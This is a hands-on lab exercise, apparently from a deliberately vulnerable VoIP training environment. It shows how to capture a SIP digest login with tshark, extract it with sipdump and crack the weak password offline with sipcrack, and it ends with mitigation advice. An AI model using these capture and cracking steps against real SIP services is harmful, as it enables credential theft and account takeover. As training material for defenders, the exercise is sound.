# Exercise 7: Offline SIP Credential Cracking with sipcrack

## Goal

Capture a legitimate SIP authentication exchange for extension `1000`, extract the captured digest from the pcap, and recover the password offline with `sipcrack`.

## Prerequisites

- DVRTC running: `docker compose up -d`
- `tshark`, `sipdump`, `sipcrack`, and `dvrtc-checks` available in the `testing` service

## Steps

### Step 1: Open a testing shell in one terminal and start a SIP capture

Run on the host:

```bash
docker compose run --rm -it testing bash
cd /work
```

In the testing shell:

```bash
tshark -i lo -f 'udp and host 127.0.0.1 and port 5070' -F pcap -a duration:30 -w register-auth.pcap
```

Leave that running. In another terminal, run the next step before the 30-second capture finishes.
The capture and extracted files are written to `artifacts/` in the repository root.

### Step 2: Open a second testing shell and generate a legitimate SIP authentication exchange

Run on the host (in a second terminal):

```bash
docker compose run --rm -it testing bash
cd /work
```

In the second testing shell:

```bash
dvrtc-checks register --host 127.0.0.1 --local-port 5070 --register-only
```

This generates a normal authenticated `REGISTER` flow for `1000:1500` from local source port `5070`.

### Step 3: Extract the captured `REGISTER` login

Return to the first terminal. The `tshark` capture should have completed after 30 seconds.

In the first testing shell:

```bash
sipdump -p register-auth.pcap register-auth-1000
```

This creates `register-auth-1000` in the current directory.

### Step 4: Create a small candidate list

In the first testing shell:

```bash
printf '1234\npassword\nadmin\n1000\n1500\n' > candidates.txt
```

### Step 5: Verify

In the first testing shell:

```bash
sipcrack -w candidates.txt register-auth-1000
```

When `sipcrack` prompts you to select an entry, enter `1`. Look for `Found password: '1500'`.

> **Troubleshooting:** If `sipdump` reports no logins found, re-run steps 1 and 2, making sure the `REGISTER` in step 2 completes before the 30-second `tshark` capture ends.

## What's happening

SIP digest authentication can be cracked offline if an attacker captures a legitimate challenge and response on the network. In this exercise, `tshark` records a normal authenticated `REGISTER` exchange for extension `1000`, and the fixed source port keeps the capture focused on that one login flow. `sipdump` then extracts that login material from the pcap for `sipcrack`.

Once the digest has been captured, password guessing happens entirely offline. The SIP service does not see the guessing activity, so a one-time capture can be enough to recover weak credentials later.

## Mitigation

- Use strong SIP passwords that resist dictionary and numeric guessing
- Protect SIP signaling with TLS so authentication exchanges are harder to capture
- Limit attacker visibility into SIP traffic with network segmentation and access controls
- Rotate credentials after suspected capture or exposure
